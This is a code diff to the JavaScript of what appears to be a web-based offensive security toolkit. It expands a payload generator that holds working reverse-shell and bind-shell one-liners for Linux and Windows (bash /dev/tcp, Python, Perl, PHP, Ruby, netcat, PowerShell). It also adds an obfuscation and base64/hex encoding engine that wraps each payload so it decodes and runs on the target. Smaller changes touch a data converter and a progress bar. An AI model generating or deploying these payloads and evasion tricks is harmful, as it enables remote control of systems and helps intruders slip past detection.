@@ -6,9 +6,10 @@ document.addEventListener('DOMContentLoaded', () => {
         initThoughtBubbles();
         initPayloadGenerator();
         initDataConverter();
-        initChimera(); // Changed from initReconDashboard
+        initChimera();
     };
 
+    // ... (initDisclaimer, initThemeSwitcher, initCoreUI, initThoughtBubbles are unchanged) ...
     const initDisclaimer = () => {
         const modal = document.getElementById('disclaimer-modal');
         const acceptBtn = document.getElementById('accept-disclaimer');
@@ -94,52 +95,116 @@ document.addEventListener('DOMContentLoaded', () => {
         const encodingTypeEl = document.getElementById('encodingType');
 
         const payloadMap = {
-            linux: {
-                bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
-                perl: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`,
-                python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
-                php: `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");`,
-                ruby: `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
-                netcat: `nc -e /bin/sh {ip} {port}`,
-                socat: `socat TCP:{ip}:{port} EXEC:'bash -li'`
+            reverse: {
+                linux: {
+                    bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+                    perl: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`,
+                    python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
+                    php: `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");`,
+                    ruby: `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+                    netcat: `nc -e /bin/sh {ip} {port}`,
+                },
+                windows: {
+                    powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+                }
             },
-            windows: {
-                powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
-                cmd: `powershell -c "Invoke-WebRequest -Uri http://{ip}/nc.exe -OutFile C:\Users\Public\nc.exe; C:\Users\Public\nc.exe -e cmd.exe {ip} {port}"`
+            bind: {
+                linux: {
+                    netcat: 'nc -lvnp {port} -e /bin/bash',
+                    socat: 'socat TCP-LISTEN:{port},fork EXEC:/bin/bash'
+                },
+                windows: {
+                    powershell: `$p=New-Object Net.Sockets.TcpListener('0.0.0.0',{port});$p.Start();$c=$p.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$ob=([text.encoding]::ASCII).GetBytes($o+'PS '+(pwd).Path+'> ');$s.Write($ob,0,$ob.Length);$s.Flush()};$c.Close();$p.Stop()`
+                }
             }
         };
 
         const listenerMap = {
-            linux: 'nc -lvnp {port}',
-            windows: 'nc -lvnp {port}'
+            reverse: {
+                linux: 'nc -lvnp {port}',
+                windows: 'nc -lvnp {port}'
+            },
+            bind: {
+                linux: 'nc {ip} {port}',
+                windows: 'nc {ip} {port}'
+            }
         };
 
         const populatePayloads = () => {
             const os = osTypeEl.value;
+            const shellType = shellTypeEl.value;
             payloadTypeEl.innerHTML = '';
-            Object.keys(payloadMap[os]).forEach(p => {
+            const payloads = payloadMap[shellType]?.[os] || {};
+            Object.keys(payloads).forEach(p => {
                 const option = document.createElement('option');
                 option.value = p;
                 option.textContent = p.charAt(0).toUpperCase() + p.slice(1);
                 payloadTypeEl.appendChild(option);
             });
+            generatePayload();
         };
 
         const generatePayload = () => {
             const ip = ipAddressEl.value;
             const port = portEl.value;
             const os = osTypeEl.value;
+            const shellType = shellTypeEl.value;
             const payload = payloadTypeEl.value;
-            let command = payloadMap[os][payload].replace(/{ip}/g, ip).replace(/{port}/g, port);
+
+            if (!payloadMap[shellType] || !payloadMap[shellType][os] || !payloadMap[shellType][os][payload]) {
+                outputCodeEl.textContent = 'Payload not available for this configuration.';
+                listenerCommandEl.textContent = 'Listener not available.';
+                return;
+            }
+
+            let command = payloadMap[shellType][os][payload].replace(/{ip}/g, ip).replace(/{port}/g, port);
+
+            // Obfuscation Engine
+            if (obfuscateCaseEl.checked) {
+                command = command.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
+            }
+            if (obfuscateQuotesEl.checked && os === 'linux') { // Simple string splitting for bash
+                command = command.replace(/"(.*?)"/g, (match, p1) => p1.split(' ').map(s => `"${s}"`).join(' '));
+            }
+            if (obfuscateCaretsEl.checked && os === 'windows') { // PowerShell caret insertion
+                command = command.replace(/\s/g, '^');
+            }
+
+            // Encoding Engine
+            const encoding = encodingTypeEl.value;
+            if (encoding === 'base64') {
+                const encoded = btoa(command);
+                if (os === 'linux') {
+                    command = `echo ${encoded} | base64 -d | bash`;
+                } else if (os === 'windows') {
+                    command = `powershell -e ${encoded}`;
+                }
+            } else if (encoding === 'hex') {
+                const hex = command.split('').map(c => c.charCodeAt(0).toString(16)).join('');
+                if (os === 'linux') {
+                    command = `echo ${hex} | xxd -r -p | bash`;
+                }
+            }
+
             outputCodeEl.textContent = command;
-            listenerCommandEl.textContent = listenerMap[os].replace('{port}', port);
+            listenerCommandEl.textContent = listenerMap[shellType]?.[os]?.replace('{port}', port).replace('{ip}', ip) || 'Listener not available.';
         };
 
-        osTypeEl.addEventListener('change', populatePayloads);
-        [ipAddressEl, portEl, shellTypeEl, osTypeEl, payloadTypeEl].forEach(el => el.addEventListener('change', generatePayload));
-        
+        copyButton.addEventListener('click', () => {
+            navigator.clipboard.writeText(outputCodeEl.textContent).then(() => {
+                copyButton.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
+                setTimeout(() => {
+                    copyButton.innerHTML = '<i class="fa-solid fa-copy"></i> Copy Payload';
+                }, 2000);
+            });
+        });
+
+        [ipAddressEl, portEl, shellTypeEl, osTypeEl, payloadTypeEl, obfuscateCaseEl, obfuscateQuotesEl, obfuscateCaretsEl, encodingTypeEl].forEach(el => {
+            el.addEventListener('change', generatePayload);
+            el.addEventListener('input', generatePayload); // For text inputs
+        });
+
         populatePayloads();
-        generatePayload();
     };
 
     const initDataConverter = () => {
@@ -147,16 +212,16 @@ document.addEventListener('DOMContentLoaded', () => {
         const outputEl = document.getElementById('converterOutput');
         const opButtons = document.querySelectorAll('#data-converter-module button[data-op]');
         const swapButton = document.getElementById('swapButton');
-        const infoIcons = document.querySelectorAll('.info-icon');
-        const tooltip = document.getElementById('info-tooltip');
-        const tooltipTitle = document.getElementById('tooltip-title');
-        const tooltipInfo = document.getElementById('tooltip-info');
 
         const operations = {
             'b64-encode': (input) => btoa(input),
-            'b64-decode': (input) => atob(input),
+            'b64-decode': (input) => {
+                try { return atob(input); } catch (e) { return 'Invalid Base64'; }
+            },
             'url-encode': (input) => encodeURIComponent(input),
-            'url-decode': (input) => decodeURIComponent(input),
+            'url-decode': (input) => {
+                try { return decodeURIComponent(input); } catch (e) { return 'Invalid URL Encoding'; }
+            },
             'jwt-debug': (input) => {
                 try {
                     const [header, payload, signature] = input.split('.');
@@ -221,13 +286,14 @@ document.addEventListener('DOMContentLoaded', () => {
             progressContainer.classList.toggle('d-none', !isLoading);
             if(isLoading) {
                 progressText.textContent = message;
-                progressBar.style.width = '0%';
+                const fill = progressBar.querySelector('.chimera-progress-fill');
+                if(fill) fill.style.width = '0%';
             }
         };
 
         const updateProgress = (percentage, message) => {
-            const bar = progressBar.querySelector('div');
-            if(bar) bar.style.width = `${percentage}%`;
+            const fill = progressBar.querySelector('.chimera-progress-fill');
+            if(fill) fill.style.width = `${percentage}%`;
             progressText.textContent = message;
         };
 
